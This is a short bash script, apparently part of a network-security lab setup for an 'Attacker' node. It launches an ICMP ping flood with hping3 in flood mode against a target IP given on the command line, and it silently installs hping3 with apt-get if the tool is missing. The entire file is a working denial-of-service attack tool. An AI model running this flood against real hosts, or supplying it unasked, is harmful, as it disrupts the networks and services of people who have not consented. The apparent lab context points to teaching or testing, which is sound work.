#!/bin/bash
# =============================================================================
# icmp_flood.sh — ICMP Flood Attack (Ping Flood)
# Target Node: Attacker
# =============================================================================
# Usage: ./icmp_flood.sh <TARGET_IP>
#
# Sends a massive number of ICMP Echo Request packets. The target must
# process and respond to each one, consuming CPU and bandwidth.
#
# Press Ctrl+C to stop the attack.
# =============================================================================

TARGET_IP="$1"

if [ -z "$TARGET_IP" ]; then
    echo "Usage: $0 <TARGET_IP>"
    echo "Example: $0 192.168.1.1"
    exit 1
fi

# Install hping3 if not present
which hping3 > /dev/null 2>&1 || { echo "[*] Installing hping3..."; apt-get update -qq && apt-get install -y -qq hping3 > /dev/null 2>&1; }

echo "============================================================"
echo "  ICMP FLOOD ATTACK"
echo "============================================================"
echo "  Target:  $TARGET_IP"
echo "  Method:  ICMP Echo Request packets (--flood mode)"
echo "  Effect:  Consumes bandwidth and CPU on the target"
echo ""
echo "  Press Ctrl+C to stop the attack."
echo "============================================================"
echo ""
echo "[*] Starting ICMP flood..."

hping3 --icmp --flood "$TARGET_IP"
